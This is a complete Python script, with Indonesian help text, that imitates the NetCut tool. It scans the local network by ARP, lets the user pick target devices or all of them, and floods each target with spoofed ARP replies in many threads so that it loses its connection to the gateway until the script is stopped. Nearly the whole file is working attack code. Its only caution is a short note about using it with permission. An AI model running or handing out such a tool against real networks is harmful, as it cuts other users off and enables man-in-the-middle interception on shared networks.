import netifaces
import wmi
from scapy.all import ARP, Ether, srp, send
import threading
import socket

def display_helper():
    helper_message = """
    === NetCut-like Python Script ===

    Penggunaan:
    1. Pilih interface jaringan yang tersedia dari daftar yang muncul.
    2. IP gateway akan secara otomatis diambil dari interface yang dipilih.
    3. Skrip akan memindai perangkat di jaringan lokal dan menampilkan daftar perangkat yang ditemukan.
    4. Pilih beberapa perangkat untuk diputus koneksinya dengan memasukkan nomor indeks perangkat, dipisahkan oleh koma (contoh: 1,3,5).
       Atau ketik "all" untuk mengeksekusi ARP spoofing pada semua perangkat yang ditemukan.
    5. Skrip akan memulai serangan ARP spoofing pada perangkat yang Anda pilih sampai Anda menghentikannya secara manual dengan menekan Ctrl+C.
       Saat menghentikan, skrip akan secara otomatis mengembalikan ARP table pada perangkat target ke kondisi normal.

    Catatan: Penggunaan skrip ini harus dilakukan dengan izin dan hanya di jaringan yang Anda kelola atau memiliki hak untuk menguji.

    =================================
    """
    print(helper_message)

def list_network_interfaces():
    c = wmi.WMI()
    interfaces = []
    
    for interface in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
        name = interface.Description
        guid = interface.SettingID
        interfaces.append((name, guid))
    
    return interfaces

def get_gateway_and_netmask(interface_guid):
    iface_info = netifaces.ifaddresses(interface_guid)
    
    # Getting the gateway for the interface
    gateway_info = netifaces.gateways()
    gateway_ip = gateway_info['default'][netifaces.AF_INET][0]

    # Getting the netmask of the local interface (to calculate the IP range)
    netmask = iface_info[netifaces.AF_INET][0]['netmask']
    
    ip_range = f"{gateway_ip}/{netmask_to_cidr(netmask)}"
    return ip_range, gateway_ip

def netmask_to_cidr(netmask):
    return sum([bin(int(x)).count('1') for x in netmask.split('.')])

def get_local_ip(interface_guid):
    iface_info = netifaces.ifaddresses(interface_guid)
    local_ip = iface_info[netifaces.AF_INET][0]['addr']
    return local_ip

def scan_network(ip_range, local_ip, gateway_ip):
    print(f"Scanning network for live hosts in range {ip_range}...")

    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    devices = []
    for element in answered_list:
        ip = element[1].psrc
        if ip != local_ip and ip != gateway_ip:
            devices.append({'ip': ip, 'mac': element[1].hwsrc})
    
    return devices

def arp_spoof(target_ip, spoof_ip, restore=False):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"WARNING: MAC address for {target_ip} not found. Skipping...")
        return

    if restore:
        gateway_mac = get_mac(spoof_ip)
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=gateway_mac)
        send(arp_response, verbose=False)
    else:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if len(answered_list) == 0:
        return None
    
    return answered_list[0][1].hwsrc

def arp_spoof_continuous(target_ip, gateway_ip):
    try:
        while True:
            arp_spoof(target_ip, gateway_ip)
    except KeyboardInterrupt:
        print(f"Stopping ARP spoofing for {target_ip} and restoring network...")
        arp_spoof(target_ip, gateway_ip, restore=True)
        print(f"Network restored for {target_ip}.")

def proses(target_ips, gateway_ip):
    threads = []
    active_threads = 0
    max_threads = 500  # Set the maximum number of threads allowed

    try:
        for ip in target_ips:
            # Check if the active thread count has reached the maximum allowed
            if active_threads < max_threads:
                thread = threading.Thread(target=arp_spoof_continuous, args=(ip, gateway_ip))
                thread.start()
                threads.append(thread)
                active_threads += 1
            else:
                raise RuntimeError("Maximum thread limit exceeded. Cannot start more than 500 threads.")

        # Join all threads
        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print("Stopping ARP spoofing and restoring network for all targets...")
        for ip in target_ips:
            arp_spoof(ip, gateway_ip, restore=True)
        print("Network restored for all targets. Exiting...")

    except RuntimeError as e:
        print(f"Error: {e}")
        print("Stopping ARP spoofing and restoring network for all targets...")
        for ip in target_ips:
            arp_spoof(ip, gateway_ip, restore=True)
        print("Network restored for all targets. Exiting...")


def start_netcut(target_ips, gateway_ip):
    print("Starting ARP spoofing attack on selected IPs...")
    for _ in range(3):
        proses(target_ips, gateway_ip)

# Tampilkan pesan bantuan
display_helper()

# 1. List network interfaces
available_interfaces = list_network_interfaces()
print("Available network interfaces:")
for idx, (name, guid) in enumerate(available_interfaces):
    print(f"{idx + 1}. {name} (GUID: {guid})")

# 2. User memilih interface
selected_idx = int(input("Select network interface (number): ")) - 1
selected_interface_guid = available_interfaces[selected_idx][1]

# 3. Get the IP range, gateway, and local IP of the selected interface
ip_range, gateway_ip = get_gateway_and_netmask(selected_interface_guid)
local_ip = get_local_ip(selected_interface_guid)
print(f"Automatically detected gateway IP: {gateway_ip}")
print(f"Automatically detected local IP: {local_ip}")

# 4. Scan network, excluding local IP and gateway IP
devices = scan_network(ip_range, local_ip, gateway_ip)
print(f"Found {len(devices)} devices in the network:")
for idx, device in enumerate(devices):
    print(f"{idx + 1}. IP: {device['ip']}, MAC: {device['mac']}")

# 5. User memilih IP target atau memilih "all"
selected_ips = input('Enter the numbers of the devices you want to cut off (comma separated, e.g., "1,3,5") or type "all" to select all devices: ').strip().lower()

if selected_ips == "all":
    target_ips = [device['ip'] for device in devices]
else:
    selected_ips = selected_ips.replace(" ", "").split(",")
    target_ips = [devices[int(idx) - 1]['ip'] for idx in selected_ips]

# 6. Start NetCut-like functionality
start_netcut(target_ips, gateway_ip)
